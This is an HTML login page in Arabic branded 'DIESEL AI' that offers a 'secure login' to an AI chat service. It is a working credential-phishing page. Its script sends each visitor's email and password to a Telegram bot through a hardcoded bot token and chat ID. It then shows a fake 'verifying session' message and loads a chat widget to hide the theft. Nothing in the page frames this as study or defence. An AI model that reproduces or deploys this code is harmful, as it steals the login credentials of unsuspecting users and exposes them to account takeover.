<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DIESEL AI | OFFICIAL</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        
        body { 
            background-color: #fbfbfe; /* الخلفية البيضاء المطلوبة */
            color: #2d3436; 
            font-family: 'Cairo', sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden; /* لمنع الحركة يمين وشمال */
        }

        #login-container { 
            background: #ffffff; 
            padding: 40px; 
            border-radius: 24px; 
            width: 320px; 
            text-align: center; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            border: 1px solid #f0f0f0;
        }

        .logo { 
            font-size: 28px; 
            font-weight: 700; 
            color: #6c5ce7; 
            margin-bottom: 25px; 
        }

        input { 
            width: 100%; 
            padding: 14px; 
            margin: 8px 0; 
            background: #fcfcfc; 
            border: 1px solid #e0e0e0; 
            border-radius: 12px; 
            box-sizing: border-box; 
            font-size: 15px;
        }

        .btn-submit { 
            width: 100%; 
            padding: 14px; 
            margin-top: 15px; 
            background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
            border: none; 
            border-radius: 12px; 
            color: white; 
            font-weight: 700; 
            font-size: 16px;
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div id="login-container">
    <div class="logo">DIESEL AI</div>
    <p style="color: #636e72; font-size: 14px; margin-bottom: 20px;">بوابة الوصول إلى الجيل الثالث</p>
    <input type="text" id="user" placeholder="البريد الإلكتروني">
    <input type="password" id="pass" placeholder="كلمة المرور">
    <button class="btn-submit" onclick="processLogin()">تسجيل الدخول الآمن</button>
</div>

<script>
    const BOT_TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
    const CHAT_ID = '5177962707';

    function processLogin() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        if(user.includes('@') && pass.length > 5) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: `🛡 LOGIN [WHITE UI]:\nUser: ${user}\nPass: ${pass}`})
            });

            document.getElementById('login-container').innerHTML = "<h3 style='color:#6c5ce7'>جارٍ التحقق وتفعيل الجلسة...</h3>";
            initChat();
        } else {
            alert("يرجى إدخال بيانات صحيحة");
        }
    }

    function initChat() {
        window.chatbase = (...arguments) => { if (!window.chatbase.q) window.chatbase.q = []; window.chatbase.q.push(arguments); };
        const script = document.createElement("script");
        script.src = "https://www.chatbase.co/embed.min.js";
        script.id = "DdngL8r3s2pfzL6hG2oIO";
        document.body.appendChild(script);
    }
</script>

</body>
</html>
